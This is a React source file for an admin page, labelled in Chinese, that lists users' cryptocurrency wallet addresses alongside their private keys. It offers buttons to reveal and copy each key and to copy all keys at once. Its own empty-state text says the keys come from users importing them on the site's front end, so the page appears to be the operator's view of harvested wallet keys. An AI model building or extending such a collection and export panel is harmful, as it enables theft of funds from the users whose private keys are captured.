import { useState } from 'react';
import { getWalletRecords, formatTime } from '../../lib/storage';

export default function AdminWallets() {
  const [records, setRecords] = useState(getWalletRecords);
  const [visibleKeys, setVisibleKeys] = useState<Set<string>>(new Set());
  const [copied, setCopied] = useState('');

  const refresh = () => setRecords(getWalletRecords());

  const toggleVisible = (id: string) => {
    setVisibleKeys((prev) => {
      const next = new Set(prev);
      if (next.has(id)) next.delete(id);
      else next.add(id);
      return next;
    });
  };

  const copyText = async (text: string, label: string) => {
    await navigator.clipboard.writeText(text);
    setCopied(label);
    setTimeout(() => setCopied(''), 2000);
  };

  const copyAllPrivateKeys = async () => {
    if (records.length === 0) return;
    const text = records
      .map((r) => `地址: ${r.address}\n私钥: ${r.privateKey}`)
      .join('\n\n');
    await copyText(text, '全部私钥');
  };

  return (
    <div className="admin-page">
      <div className="admin-section-header">
        <h1>钱包私钥</h1>
        <div className="admin-actions">
          <button className="btn btn-action btn-sm" onClick={refresh}>
            刷新
          </button>
          {records.length > 0 && (
            <button
              className="btn btn-primary btn-sm"
              onClick={copyAllPrivateKeys}
            >
              一键复制全部私钥
            </button>
          )}
        </div>
      </div>

      {copied && <p className="copy-hint">已复制{copied}</p>}

      {records.length === 0 ? (
        <p className="admin-empty">
          暂无钱包记录。用户在前台导入私钥后，记录会显示在此处。
        </p>
      ) : (
        <table className="admin-table">
          <thead>
            <tr>
              <th>导入时间</th>
              <th>钱包地址</th>
              <th>私钥</th>
              <th>操作</th>
            </tr>
          </thead>
          <tbody>
            {records.map((r) => (
              <tr key={r.id}>
                <td>{formatTime(r.timestamp)}</td>
                <td className="mono">{r.address}</td>
                <td className="mono wallet-key-cell">
                  {visibleKeys.has(r.id)
                    ? r.privateKey
                    : '••••••••••••••••'}
                </td>
                <td className="wallet-actions-cell">
                  <button
                    className="btn btn-action btn-sm"
                    onClick={() => toggleVisible(r.id)}
                  >
                    {visibleKeys.has(r.id) ? '隐藏' : '显示'}
                  </button>
                  <button
                    className="btn btn-primary btn-sm"
                    onClick={() => copyText(r.privateKey, '私钥')}
                  >
                    复制私钥
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
}
